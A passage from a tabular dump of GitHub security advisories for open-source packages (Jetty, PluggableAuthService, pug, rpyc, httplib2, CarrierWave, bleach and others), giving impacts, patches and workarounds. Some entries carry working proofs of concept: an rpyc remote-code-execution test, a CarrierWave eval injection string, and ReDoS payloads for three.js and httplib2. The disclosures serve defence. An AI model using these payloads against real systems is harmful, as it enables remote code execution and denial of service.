Quality ordered values are used infrequently by jetty so they can be avoided by:

 * Do not use the default error page/handler.
 * Do not deploy the `StatisticsServlet` exposed to the network
 * Do not call `getLocale` API
 * Do not enable precompressed static content in the `DefaultServlet` 

### Patches

All patches are available for download from the Eclipse Jetty website at [https://www.eclipse.org/jetty/download.php](https://www.eclipse.org/jetty/download.php)
- 9.4.37.v20210219 and greater
- 10.0.1 and greater 
- 11.0.1 and greater",maven
520,30392,Products.PluggableAuthService,GHSA-p44j-xrqg-4xrr,CVE-2021-21337,https://github.com/advisories/GHSA-p44j-xrqg-4xrr,low,2021-03-08 21:06:23 UTC,URL Redirection to Untrusted Site ('Open Redirect') in Products.PluggableAuthService,"### Impact
_What kind of vulnerability is it? Who is impacted?_

Open redirect vulnerability - a maliciously crafted link to the login form and login functionality could redirect the browser to a different website.

### Patches
_Has the problem been patched? What versions should users upgrade to?_

The problem has been fixed in version 2.6.1. Depending on how you have installed Products.PluggableAuthService, you should change the buildout version pin to `2.6.1`  and re-run the buildout, or if you used `pip` simply do `pip install ""Products.PluggableAuthService>=2.6.1""`

### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_

There is no workaround. Users are encouraged to upgrade.

### References
_Are there any links users can visit to find out more?_

- [GHSA-p44j-xrqg-4xrr](https://github.com/zopefoundation/Products.PluggableAuthService/security/advisories/GHSA-p44j-xrqg-4xrr)
- [Products.PluggableAuthService on PyPI](https://pypi.org/project/Products.PluggableAuthService/)
- [OWASP page on open redirects](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)

### For more information
If you have any questions or comments about this advisory:
* Open an issue in the [Products.PluggableAuthService issue tracker](https://github.com/zopefoundation/Products.PluggableAuthService/issues)
* Email us at [security@plone.org](mailto:security@plone.org)",pip
521,30392,Products.PluggableAuthService,GHSA-p75f-g7gx-2r7p,CVE-2021-21336,https://github.com/advisories/GHSA-p75f-g7gx-2r7p,moderate,2021-03-08 20:38:35 UTC,Exposure of Sensitive Information to an Unauthorized Actor in Products.PluggableAuthService ZODBRoleManager,"### Impact
_What kind of vulnerability is it? Who is impacted?_

Information disclosure vulnerability - everyone can list the names of roles defined in the ZODB Role Manager plugin if the site uses this plugin.

### Patches
_Has the problem been patched? What versions should users upgrade to?_

The problem has been fixed in version 2.6.0. Depending on how you have installed Products.PluggableAuthService, you should change the buildout version pin to 2.6.0 and re-run the buildout, or if you used pip simply do `pip install ""Products.PluggableAuthService>=2.6.0""`

### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_

There is no workaround. Users are encouraged to upgrade.

### References
_Are there any links users can visit to find out more?_

- [GHSA-p75f-g7gx-2r7p](https://github.com/zopefoundation/Products.PluggableAuthService/security/advisories/GHSA-p75f-g7gx-2r7p)
- [Products.PluggableAuthService on PyPI](https://github.com/zopefoundation/Products.PluggableAuthService)

### For more information
If you have any questions or comments about this advisory:
* Open an issue in the [Products.PluggableAuthService issue tracker](https://github.com/zopefoundation/Products.PluggableAuthService/issues)
* Email us at [security@plone.org](mailto:security@plone.org)",pip
522,16878,elliptic,GHSA-r9p9-mrjm-926w,CVE-2020-28498,https://github.com/advisories/GHSA-r9p9-mrjm-926w,moderate,2021-03-08 16:06:50 UTC,Use of a Broken or Risky Cryptographic Algorithm,The npm package `elliptic` before version 6.5.4 are vulnerable to Cryptographic Issues via the secp256k1 implementation in elliptic/ec/key.js. There is no check to confirm that the public key point passed into the derive function actually exists on the secp256k1 curve. This results in the potential for the private key used in this implementation to be revealed after a number of ECDH operations are performed.,npm
523,29942,botframework-connector,GHSA-cqff-fx2x-p86v,,https://github.com/advisories/GHSA-cqff-fx2x-p86v,high,2021-03-08 15:50:10 UTC,Improper Authentication,"### Impact
A maliciously crafted claim may be incorrectly authenticated by the bot. Impacts bots that are not configured to be used as a Skill. This vulnerability requires an attacker to have internal knowledge of the bot.

### Patches
The problem has been patched in all affected versions. Please see the list of patched versions for the most appropiate one for your individual case.

### Workarounds
Users who do not wish or are not able to upgrade can add an authentication configuration containing ClaimsValidator, which throws an exception if Claims are Skill Claims. 

For detailed instructions, see the link in the References section.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [Microsoft Bot Builder SDK](https://github.com/microsoft/botframework-sdk)
* Email us at [bf-reports@microsoft.com](mailto:bf-reports@microsoft.com)",pip
524,14107,Microsoft.Bot.Connector,GHSA-qxx8-292g-2w66,,https://github.com/advisories/GHSA-qxx8-292g-2w66,high,2021-03-08 15:50:01 UTC,Improper Authentication,"### Impact
A maliciously crafted claim may be incorrectly authenticated by the bot. Impacts bots that are not configured to be used as a Skill. This vulnerability requires an an attacker to have internal knowledge of the bot.

### Patches
The problem has been patched in all affected versions. Please see the list of patched versions for the most appropriate one for your individual case.

### Workarounds
Users who do not wish or are not able to upgrade can add an authentication configuration containing ClaimsValidator which throws an exception if the Claims are Skill Claims.

For detailed instructions, see the link in the References section.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [Microsoft Bot Builder SDK](https://github.com/microsoft/botbuilder-dotnet)
* Email us at [bf-reports@microsoft.com](mailto:bf-reports@microsoft.com)",nuget
525,16227,pug,GHSA-p493-635q-r6gr,CVE-2021-21353,https://github.com/advisories/GHSA-p493-635q-r6gr,high,2021-03-03 02:03:52 UTC,Remote code execution via the `pretty` option.,"### Impact

If a remote attacker was able to control the `pretty` option of the pug compiler, e.g. if you spread a user provided object such as the query parameters of a request into the pug template inputs, it was possible for them to achieve remote code execution on the node.js backend.

### Patches

Upgrade to `pug@3.0.1` or `pug-code-gen@3.0.2` or `pug-code-gen@2.0.3`, which correctly sanitise the parameter.

### Workarounds

If there is no way for un-trusted input to be passed to pug as the `pretty` option, e.g. if you compile templates in advance before applying user input to them, you do not need to upgrade.

### References


Original report: https://github.com/pugjs/pug/issues/3312

### For more information

If you believe you have found other vulnerabilities, please **DO NOT** open an issue. Instead, you can follow the instructions in our [Security Policy](https://github.com/pugjs/pug/blob/master/SECURITY.md)",npm
526,18865,actionpack,GHSA-8877-prq4-9xfw,CVE-2021-22881,https://github.com/advisories/GHSA-8877-prq4-9xfw,moderate,2021-03-02 03:44:17 UTC,Open Redirect in actionpack,"The Host Authorization middleware in Action Pack before 6.1.2.1, 6.0.3.5 suffers from an open redirect vulnerability. Specially crafted `Host` headers in combination with certain ""allowed host"" formats can cause the Host Authorization middleware in Action Pack to redirect users to a malicious website. Impacted applications will have allowed hosts with a leading dot. When an allowed host contains a leading dot, a specially crafted `Host` header can be used to redirect to a malicious website.",rubygems
527,18828,activerecord,GHSA-8hc4-xxm3-5ppp,CVE-2021-22880,https://github.com/advisories/GHSA-8hc4-xxm3-5ppp,high,2021-03-02 03:44:14 UTC,Regular Expression Denial-of-Service,"The PostgreSQL adapter in Active Record before 6.1.2.1, 6.0.3.5, 5.2.4.5 suffers from a regular expression denial of service (REDoS) vulnerability. Carefully crafted input can cause the input validation in the `money` type of the PostgreSQL adapter in Active Record to spend too much time in a regular expression, resulting in the potential for a DoS attack. This only impacts Rails applications that are using PostgreSQL along with money type columns that take user input.",rubygems
528,17237,urijs,GHSA-p6j9-7xhc-rhwp,CVE-2021-27516,https://github.com/advisories/GHSA-p6j9-7xhc-rhwp,high,2021-03-01 20:03:53 UTC,Hostname spoofing via backslashes in URL,"### Impact
If using affected versions to determine a URL's hostname, the hostname can be spoofed by using a backslash (`\`) character as part of the scheme delimiter, e.g. `scheme:/\hostname`. If the hostname is used in security decisions, the decision may be incorrect.

Depending on library usage and attacker intent, impacts may include allow/block list bypasses, SSRF attacks, open redirects, or other undesired behavior.

Example URL: `https:/\expected-example.com/path`
Escaped string: `https:/\\expected-example.com/path` (JavaScript strings must escape backslash)

Affected versions incorrectly return no hostname. Patched versions correctly return `expected-example.com`. Patched versions match the behavior of other parsers which implement the [WHATWG URL specification](https://url.spec.whatwg.org/), including web browsers and [Node's built-in URL class](https://nodejs.org/api/url.html).

### Patches
Version 1.19.6 is patched against all known payload variants.

### References
https://github.com/medialize/URI.js/releases/tag/v1.19.6 (fix for this particular bypass)
https://github.com/medialize/URI.js/releases/tag/v1.19.4 (fix for related bypass)
https://github.com/medialize/URI.js/releases/tag/v1.19.3 (fix for related bypass)
[PR #233](https://github.com/medialize/URI.js/pull/233) (initial fix for backslash handling)

### For more information
If you have any questions or comments about this advisory, open an issue in https://github.com/medialize/URI.js

### Reporter credit
[Yaniv Nizry](https://twitter.com/ynizry) from the CxSCA AppSec team at Checkmarx",npm
529,19852,aiohttp,GHSA-v6wp-4m6f-gcjg,CVE-2021-21330,https://github.com/advisories/GHSA-v6wp-4m6f-gcjg,low,2021-02-26 02:11:57 UTC,`aiohttp` Open Redirect vulnerability (`normalize_path_middleware` middleware),"### Impact
_What kind of vulnerability is it? Who is impacted?_

Open redirect vulnerability — a maliciously crafted link to an aiohttp-based web-server could redirect the browser to a different website.

It is caused by a bug in the `aiohttp.web_middlewares.normalize_path_middleware` middleware.

### Patches
_Has the problem been patched? What versions should users upgrade to?_

This security problem has been fixed in v3.7.4. Upgrade your dependency as follows:
[`pip install aiohttp >= 3.7.4`]

### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_

If upgrading is not an option for you, a workaround can be to avoid using `aiohttp.web_middlewares.normalize_path_middleware` in your applications.

### References
_Are there any links users can visit to find out more?_

* [aiohttp @ PyPI]
* [GHSA-v6wp-4m6f-gcjg]
* [OWASP page on open redirects]

### For more information

If you have any questions or comments about this advisory:
* Open an issue in the [aiohttp repo](https://github.com/aio-libs/aiohttp/issues/new/choose)
* Email us at wk+aio-libs-security@sydorenko.org.ua and/or andrew.svetlov+aio-libs-security@gmail.com

Credit: [Jelmer Vernooĳ] and [Beast Glatisant].

[aiohttp @ PyPI]: https://pypi.org/p/aiohttp
[`pip install aiohttp >= 3.7.4`]: https://pypi.org/project/aiohttp/3.7.4/
[GHSA-v6wp-4m6f-gcjg]: https://github.com/aio-libs/aiohttp/security/advisories/GHSA-v6wp-4m6f-gcjg
[OWASP page on open redirects]:
https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html

[Jelmer Vernooĳ]: https://jelmer.uk
[Beast Glatisant]: https://github.com/g147",pip
530,16653,three,GHSA-fq6p-x6j3-cmmq,CVE-2020-28496,https://github.com/advisories/GHSA-fq6p-x6j3-cmmq,high,2021-03-01 19:57:16 UTC,Denial of service in three,"This affects the package three before 0.125.0. This can happen when handling rgb or hsl colors. PoC: var three = require('three') function build_blank (n) { var ret = ""rgb("" for (var i = 0; i < n; i++) { ret += "" "" } return ret + """"; } var Color = three.Color var time = Date.now(); new Color(build_blank(50000)) var time_cost = Date.now() - time; console.log(time_cost+"" ms"")",npm
531,16351,prismjs,GHSA-h4hr-7fg3-h35w,CVE-2021-23341,https://github.com/advisories/GHSA-h4hr-7fg3-h35w,high,2021-03-01 19:52:33 UTC,Denial of service in prismjs,"The package prismjs before 1.23.0 are vulnerable to Regular Expression Denial of Service (ReDoS) via the prism-asciidoc, prism-rest, prism-tap and prism-eiffel components.",npm
532,36340,org.nanohttpd:nanohttpd,GHSA-pr5m-4w22-8483,CVE-2020-13697,https://github.com/advisories/GHSA-pr5m-4w22-8483,moderate,2021-02-25 16:32:34 UTC,XXS in NanoHTTPD,"An issue was discovered in RouterNanoHTTPD.java in NanoHTTPD through 2.3.1. The GeneralHandler class implements a basic GET handler that prints debug information as an HTML page. Any web server that extends this class without implementing its own GET handler is vulnerable to reflected XSS, because the GeneralHandler GET handler prints user input passed through the query string without any sanitization.",maven
533,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-288c-cq4h-88gq,CVE-2020-25649,https://github.com/advisories/GHSA-288c-cq4h-88gq,high,2021-02-18 20:51:54 UTC,XML External Entity (XXE) Injection in Jackson Databind,"A flaw was found in FasterXML Jackson Databind, where it did not have entity expansion secured properly. This flaw allows vulnerability to XML external entity (XXE) attacks. The highest threat from this vulnerability is data integrity.",maven
534,20568,rpyc,GHSA-pj4g-4488-wmxm,CVE-2019-16328,https://github.com/advisories/GHSA-pj4g-4488-wmxm,high,2021-02-17 19:50:58 UTC,Dynamic modification of RPyC service due to missing security check,"### Impact
Version 4.1.0 of RPyC has a vulnerability that affects custom RPyC services making it susceptible to authenticated remote attacks.

### Patches
Git commits between September 2018 and October 2019 and version 4.1.0 are vulnerable. Use a version of RPyC that is not affected.

### Workarounds
The commit `d818ecc83a92548994db75a0e9c419c7bce680d6` could be used as a patch to add the missing access check.

### References
[CVE-2019-16328](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-16328)
[RPyC Security Documentation](https://rpyc.readthedocs.io/en/latest/docs/security.html#security)

### For more information
If you have any questions or comments about this advisory:
* Open an issue using [GitHub](https://github.com/tomerfiliba-org/rpyc)

### Proof of Concept
```
import logging
import rpyc
import tempfile
from subprocess import Popen, PIPE
import unittest


PORT = 18861
SERVER_SCRIPT = f""""""#!/usr/bin/env python
import rpyc
from rpyc.utils.server import ThreadedServer, ThreadPoolServer
from rpyc import SlaveService
import rpyc


class Foe(object):
    foo = ""bar""


class Fee(rpyc.Service):
    exposed_Fie = Foe

    def exposed_nop(self):
        return


if __name__ == ""__main__"":
    server = ThreadedServer(Fee, port={PORT}, auto_register=False)
    thd = server.start()
""""""


def setattr_orig(target, attrname, codeobj):
    setattr(target, attrname, codeobj)


def myeval(self=None, cmd=""__import__('sys')""):
    return eval(cmd)


def get_code(obj_codetype, func, filename=None, name=None):
    func_code = func.__code__
    arg_names = ['co_argcount', 'co_posonlyargcount', 'co_kwonlyargcount', 'co_nlocals', 'co_stacksize', 'co_flags',
                 'co_code', 'co_consts', 'co_names', 'co_varnames', 'co_filename', 'co_name', 'co_firstlineno',
                 'co_lnotab', 'co_freevars', 'co_cellvars']

    codetype_args = [getattr(func_code, n) for n in arg_names]
    if filename:
        codetype_args[arg_names.index('co_filename')] = filename
    if name:
        codetype_args[arg_names.index('co_name')] = name
    mycode = obj_codetype(*codetype_args)
    return mycode


def _vercmp_gt(ver1, ver2):
    ver1_gt_ver2 = False
    for i, v1 in enumerate(ver1):
        v2 = ver2[i]
        if v1 > v2:
            ver1_gt_ver2 = True
            break
        elif v1 == v2:
            continue
        else:  # v1 < v2
            break
    return ver1_gt_ver2


@unittest.skipIf(not _vercmp_gt(rpyc.__version__, (3, 4, 4)), ""unaffected version"")
class Test_InfoDisclosure_Service(unittest.TestCase):

    @classmethod
    def setUpClass(cls):

        cls.logger = logging.getLogger('rpyc')
        cls.logger.setLevel(logging.DEBUG)  # NOTSET only traverses until another level is found, so DEBUG is preferred
        cls.hscript = tempfile.NamedTemporaryFile()
        cls.hscript.write(SERVER_SCRIPT.encode())
        cls.hscript.flush()
        while cls.hscript.file.tell() != len(SERVER_SCRIPT):
            pass
        cls.server = Popen([""python"", cls.hscript.name], stdout=PIPE, stderr=PIPE, text=True)
        cls.conn = rpyc.connect(""localhost"", PORT)

    @classmethod
    def tearDownClass(cls):
        cls.conn.close()
        cls.logger.info(cls.server.stdout.read())
        cls.logger.info(cls.server.stderr.read())
        cls.server.kill()
        cls.hscript.close()

    def netref_getattr(self, netref, attrname):
        # PoC CWE-358: abuse __cmp__ function that was missing a security check
        handler = rpyc.core.consts.HANDLE_CMP
        return self.conn.sync_request(handler, netref, attrname, '__getattribute__')

    def test_1_modify_nop(self):
        # create netrefs for builtins and globals that will be used to construct on remote
        remote_svc_proto = self.netref_getattr(self.conn.root, '_protocol')
        remote_dispatch = self.netref_getattr(remote_svc_proto, '_dispatch_request')
        remote_class_globals = self.netref_getattr(remote_dispatch, '__globals__')
        remote_modules = self.netref_getattr(remote_class_globals['sys'], 'modules')
        _builtins = remote_modules['builtins']
        remote_builtins = {k: self.netref_getattr(_builtins, k) for k in dir(_builtins)}

        # populate globals for CodeType calls on remote
        remote_globals = remote_builtins['dict']()
        for name, netref in remote_builtins.items():
            remote_globals[name] = netref
        for name, netref in self.netref_getattr(remote_modules, 'items')():
            remote_globals[name] = netref

        # create netrefs for types to create remote function malicously
        remote_types = remote_builtins['__import__'](""types"")
        remote_types_CodeType = self.netref_getattr(remote_types, 'CodeType')
        remote_types_FunctionType = self.netref_getattr(remote_types, 'FunctionType')

        # remote eval function constructed
        remote_eval_codeobj = get_code(remote_types_CodeType, myeval, filename='test_code.py', name='__code__')
        remote_eval = remote_types_FunctionType(remote_eval_codeobj, remote_globals)
        # PoC CWE-913: modify the exposed_nop of service
        #   by binding various netrefs in this execution frame, they are cached in
        #   the remote address space. setattr and eval functions are cached for the life
        #   of the netrefs in the frame. A consequence of Netref classes inheriting
        #   BaseNetref, each object is cached under_local_objects. So, we are able
        #   to construct arbitrary code using types and builtins.

        # use the builtin netrefs to modify the service to use the constructed eval func
        remote_setattr = remote_builtins['setattr']
        remote_type = remote_builtins['type']
        remote_setattr(remote_type(self.conn.root), 'exposed_nop', remote_eval)

        # show that nop was replaced by eval to complete the PoC
        remote_sys = self.conn.root.nop('__import__(""sys"")')
        remote_stack = self.conn.root.nop('"""".join(__import__(""traceback"").format_stack())')
        self.assertEqual(type(remote_sys).__name__, 'builtins.module')
        self.assertIsInstance(remote_sys, rpyc.core.netref.BaseNetref)
        self.assertIn('rpyc/utils/server.py', remote_stack)

    def test_2_new_conn_impacted(self):
        # demostrate impact and scope of vuln for new connections
        self.conn.close()
        self.conn = rpyc.connect(""localhost"", PORT)
        # show new conn can still use nop as eval
        remote_sys = self.conn.root.nop('__import__(""sys"")')
        remote_stack = self.conn.root.nop('"""".join(__import__(""traceback"").format_stack())')
        self.assertEqual(type(remote_sys).__name__, 'builtins.module')
        self.assertIsInstance(remote_sys, rpyc.core.netref.BaseNetref)
        self.assertIn('rpyc/utils/server.py', remote_stack)


if __name__ == ""__main__"":
    unittest.main()
```",pip
535,19850,cryptography,GHSA-rhm9-p9w5-fwm7,CVE-2020-36242,https://github.com/advisories/GHSA-rhm9-p9w5-fwm7,critical,2021-02-10 01:32:27 UTC,Symmetrically encrypting large values can lead to integer overflow,"cryptography is a package designed to expose cryptographic primitives and recipes to Python developers. When certain sequences of `update()` calls with large values (multiple GBs) for symetric encryption or decryption occur, it's possible for an integer overflow to happen, leading to mishandling of buffers. This is patched in version 3.3.2 and newer.
",pip
536,16065,marked,GHSA-4r62-v4vq-hr96,CVE-2021-21306,https://github.com/advisories/GHSA-4r62-v4vq-hr96,moderate,2021-02-08 21:17:58 UTC,Regular Expression Denial of Service (REDoS) in Marked,"### Impact
_What kind of vulnerability is it? Who is impacted?_

[Regular expression Denial of Service](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS)

A Denial of Service attack can affect anyone who runs user generated code through `marked`.

### Patches
_Has the problem been patched? What versions should users upgrade to?_

patched in v2.0.0

### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_

None.

### References
_Are there any links users can visit to find out more?_

https://github.com/markedjs/marked/issues/1927
https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [marked](https://github.com/markedjs/marked/issues)",npm
537,19914,httplib2,GHSA-93xj-8mrv-444m,CVE-2021-21240,https://github.com/advisories/GHSA-93xj-8mrv-444m,low,2021-02-08 19:41:59 UTC,Regular Expression Denial of Service (REDoS) in httplib2,"### Impact
A malicious server which responds with long series of `\xa0` characters in the `www-authenticate` header may cause Denial of Service (CPU burn while parsing header) of the httplib2 client accessing said server.

### Patches
Version 0.19.0 contains new implementation of auth headers parsing, using pyparsing library.
https://github.com/httplib2/httplib2/pull/182

### Workarounds
```py
import httplib2
httplib2.USE_WWW_AUTH_STRICT_PARSING = True
```

### Technical Details

The vulnerable regular expression is https://github.com/httplib2/httplib2/blob/595e248d0958c00e83cb28f136a2a54772772b50/python3/httplib2/__init__.py#L336-L338

The section before the equals sign contains multiple overlapping groups. Ignoring the optional part containing a comma, we have:

    \s*[^ \t\r\n=]+\s*=

Since all three infinitely repeating groups accept the non-breaking space character `\xa0`, a long string of `\xa0` causes catastrophic backtracking.

The complexity is cubic, so doubling the length of the malicious string of `\xa0` makes processing take 8 times as long.

### Reproduction Steps

Run a malicious server which responds with

    www-authenticate: x \xa0\xa0\xa0\xa0x

but with many more `\xa0` characters.

An example malicious python server is below:

```py
from http.server import BaseHTTPRequestHandler, HTTPServer

def make_header_value(n_spaces):
    repeat = ""\xa0"" * n_spaces
    return f""x {repeat}x""

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.log_request(401)
        self.send_response_only(401)  # Don't bother sending Server and Date
        n_spaces = (
            int(self.path[1:])  # Can GET e.g. /100 to test shorter sequences
            if len(self.path) > 1 else
            65512  # Max header line length 65536
        )
        value = make_header_value(n_spaces)
        self.send_header(""www-authenticate"", value)  # This header can actually be sent multiple times
        self.end_headers()

if __name__ == ""__main__"":
    HTTPServer(("""", 1337), Handler).serve_forever()
```

Connect to the server with httplib2:

```py
import httplib2
httplib2.Http("".cache"").request(""http://localhost:1337"", ""GET"")
```

To benchmark performance with shorter strings, you can set the path to a number e.g. http://localhost:1337/1000


### References
Thanks to [Ben Caller](https://github.com/b-c-ds) ([Doyensec](https://doyensec.com)) for finding vulnerability and discrete notification.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [httplib2](https://github.com/httplib2/httplib2/issues/new)
* Email [current maintainer at 2021-01](mailto:temotor@gmail.com)",pip
538,18961,carrierwave,GHSA-cf3w-g86h-35x4,CVE-2021-21305,https://github.com/advisories/GHSA-cf3w-g86h-35x4,high,2021-02-08 19:16:39 UTC,Code Injection vulnerability in CarrierWave::RMagick,"### Impact
[CarrierWave::RMagick](https://github.com/carrierwaveuploader/carrierwave/blob/master/lib/carrierwave/processing/rmagick.rb) has a Code Injection vulnerability. Its `#manipulate!` method inappropriately evals the content of mutation option(`:read`/`:write`), allowing attackers to craft a string that can be executed as a Ruby code.
If an application developer supplies untrusted inputs to the option, it will lead to remote code execution(RCE).

(But supplying untrusted input to the option itself is dangerous even in absence of this vulnerability, since is prone to DoS vulnerability - attackers can try to consume massive amounts of memory by resizing to a very large dimension)

### Proof of Concept
```ruby
class MyUploader < CarrierWave::Uploader::Base
  include CarrierWave::RMagick
end

MyUploader.new.manipulate!({ read: { density: ""1 }; p 'Hacked'; {"" }}) # => shows ""Hacked""
```

### Patches
Upgrade to [2.1.1](https://rubygems.org/gems/carrierwave/versions/2.1.1) or [1.3.2](https://rubygems.org/gems/carrierwave/versions/1.3.2).

### Workarounds
Stop supplying untrusted input to `#manipulate!`'s mutation option.

### References
[Code Injection Software Attack](https://owasp.org/www-community/attacks/Code_Injection)

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [CarrierWave repo](https://github.com/carrierwaveuploader/carrierwave)
* Email me at [mit.shibuya@gmail.com](mailto:mit.shibuya@gmail.com)",rubygems
539,18961,carrierwave,GHSA-fwcm-636p-68r5,CVE-2021-21288,https://github.com/advisories/GHSA-fwcm-636p-68r5,low,2021-02-08 19:16:26 UTC,Server-side request forgery in CarrierWave,"### Impact
[CarrierWave download feature](https://github.com/carrierwaveuploader/carrierwave#uploading-files-from-a-remote-location) has an SSRF vulnerability, allowing attacks to provide DNS entries or IP addresses that are intended for internal use and gather information about the Intranet infrastructure of the platform.

### Patches
Upgrade to [2.1.1](https://rubygems.org/gems/carrierwave/versions/2.1.1) or [1.3.2](https://rubygems.org/gems/carrierwave/versions/1.3.2).

### Workarounds
Using proper network segmentation and applying the principle of least privilege to outbound connections from application servers can reduce the severity of SSRF vulnerabilities. Ideally the vulnerable gem should run on an isolated server without access to any internal network resources or cloud metadata access.

### References
[Server-Side Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [CarrierWave repo](https://github.com/carrierwaveuploader/carrierwave)
* Email me at [mit.shibuya@gmail.com](mailto:mit.shibuya@gmail.com)",rubygems
540,33967,org.apache.ant:ant,GHSA-f62v-xpxf-3v68,CVE-2020-11979,https://github.com/advisories/GHSA-f62v-xpxf-3v68,high,2021-02-03 19:16:35 UTC,Code injection in Apache Ant,"As mitigation for CVE-2020-1945 Apache Ant 1.10.8 changed the permissions of temporary files it created so that only the current user was allowed to access them. Unfortunately the fixcrlf task deleted the temporary file and created a new one without said protection, effectively nullifying the effort. This would still allow an attacker to inject modified source files into the build process.",maven
541,35846,org.http4s:http4s-blaze-server_2.12,GHSA-xhv5-w9c5-2r2w,CVE-2021-21294,https://github.com/advisories/GHSA-xhv5-w9c5-2r2w,high,2021-02-02 21:42:56 UTC,Unbounded connection acceptance in http4s-blaze-server,"### Impact

blaze-core, a library underlying http4s-blaze-server, accepts connections unboundedly on its selector pool. This has the net effect of amplifying degradation in services that are unable to handle their current request load, since incoming connections are still accepted and added to an unbounded queue. Each connection allocates a socket handle, which drains a scarce OS resource. This can also confound higher level circuit breakers which work based on detecting failed connections.

http4s provides a general `MaxActiveRequests` middleware mechanism for limiting open connections, but it is enforced inside the Blaze accept loop, after the connection is accepted and the socket opened. Thus, the limit only prevents the number of connections which can be simultaneously processed, not the number of connections which can be held open.

### Patches

In 0.21.18, 0.22.0-M3, and 1.0.0-M16, a new`maxConnections` property, with a default value of 1024, has been added to the `BlazeServerBuilder`.  Setting the value to a negative number restores unbounded behavior, but is strongly disrecommended.  

The NIO2 backend does not respect `maxConnections`.  Its use is now deprecated in http4s-0.21, and the option is removed altogether starting in http4s-0.22.

The connections are bounded in 0.21.17, 0.22.0-M2, and 1.0.0-M14, but the `maxConnections` parameter was passed incorrectly, making it impossible to change the Blaze default of 512. 

### Workarounds
* An Nginx side-car acting as a reverse proxy for the local http4s-blaze-server instance would be able to apply a connection limiting semantic before the sockets reach blaze-core. Nginx’s connection bounding is both asynchronous and properly respects backpressure.
* http4s-ember-server is an alternative to http4s-blaze-server, but does not yet have HTTP/2 or web socket support.  Its performance in terms of RPS is appreciably behind Blaze’s, and as the newest backend, has substantially less industrial uptake.
* http4s-jetty is an alternative to http4s-blaze-server, but does not yet have web socket support.  Its performance in terms of requests per second is somewhat behind Blaze’s, and despite Jetty's industrial adoption, the http4s integration has substantially less industrial uptake.
* http4s-tomcat is an alternative to http4s-blaze-server, but does not yet have HTTP/2 web socket support.  Its performance in terms of requests per second is somewhat behind Blaze’s, and despite Jetty's industrial adoption, the http4s integration has substantially less industrial uptake.

### References

See [the Blaze GHSA](https://github.com/http4s/blaze/security/advisories/GHSA-xmw9-q7x9-j5qc) for more on the underlying issue.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [http4s/http4s](http://github.com/http4s/http4s)
* Contact us according to the [http4s security policy](https://github.com/http4s/http4s/security/policy)",maven
542,18898,mechanize,GHSA-qrqm-fpv6-6r8g,CVE-2021-21289,https://github.com/advisories/GHSA-qrqm-fpv6-6r8g,high,2021-02-02 18:50:27 UTC,Command Injection Vulnerability in Mechanize,"This security advisory has been created for public disclosure of a Command Injection vulnerability that was responsibly reported by @kyoshidajp (Katsuhiko YOSHIDA).

### Impact

Mechanize `>= v2.0`, `< v2.7.7` allows for OS commands to be injected using several classes' methods which implicitly use Ruby's `Kernel.open` method. Exploitation is possible only if untrusted input is used as a local filename and passed to any of these calls:

- `Mechanize::CookieJar#load`: since v2.0 (see 208e3ed)
- `Mechanize::CookieJar#save_as`: since v2.0 (see 5b776a4)
- `Mechanize#download`: since v2.2 (see dc91667)
- `Mechanize::Download#save` and `#save!` since v2.1 (see 98b2f51, bd62ff0)
- `Mechanize::File#save` and `#save_as`: since v2.1 (see 2bf7519)
- `Mechanize::FileResponse#read_body`: since v2.0 (see 01039f5)


### Patches

These vulnerabilities are patched in Mechanize v2.7.7.


### Workarounds

No workarounds are available. We recommend upgrading to v2.7.7 or later.


### References

See https://docs.rubocop.org/rubocop/cops_security.html#securityopen for background on why `Kernel.open` should not be used with untrusted input.


### For more information

If you have any questions or comments about this advisory, please open an issue in [sparklemotion/mechanize](https://github.com/sparklemotion/mechanize/issues/new).",rubygems
543,20045,bleach,GHSA-vv2x-vrpj-qqpq,CVE-2021-23980,https://github.com/advisories/GHSA-vv2x-vrpj-qqpq,moderate,2021-02-02 17:58:40 UTC,Cross-site scripting in Bleach,"### Impact                                                                                                                                                                                                                                                    

A [mutation XSS](https://cure53.de/fp170.pdf) affects users calling `bleach.clean` with all of:

* `svg` or `math` in the allowed tags
* `p` or `br` in allowed tags
* `style`, `title`, `noscript`, `script`, `textarea`, `noframes`, `iframe`, or `xmp` in allowed tags
* the keyword argument `strip_comments=False`

Note: none of the above tags are in the default allowed tags and `strip_comments` defaults to `True`.

### Patches

Users are encouraged to upgrade to bleach v3.3.0 or greater.

Note: bleach v3.3.0 introduces a breaking change to escape HTML comments by default.

### Workarounds

* modify `bleach.clean` calls to at least one of:
  * not allow the `style`, `title`, `noscript`, `script`, `textarea`, `noframes`, `iframe`, or `xmp` tag
  * not allow `svg` or `math` tags
  * not allow `p` or `br` tags
  * set `strip_comments=True`

* A strong [Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) without `unsafe-inline` and `unsafe-eval` [`script-src`s](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)) will also help mitigate the risk.

### References

* https://bugzilla.mozilla.org/show_bug.cgi?id=1689399
* https://advisory.checkmarx.net/advisory/CX-2021-4303
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-23980
* https://cure53.de/fp170.pdf

### Credits

* Reported by [Yaniv Nizry](https://twitter.com/ynizry) from the CxSCA AppSec group at Checkmarx
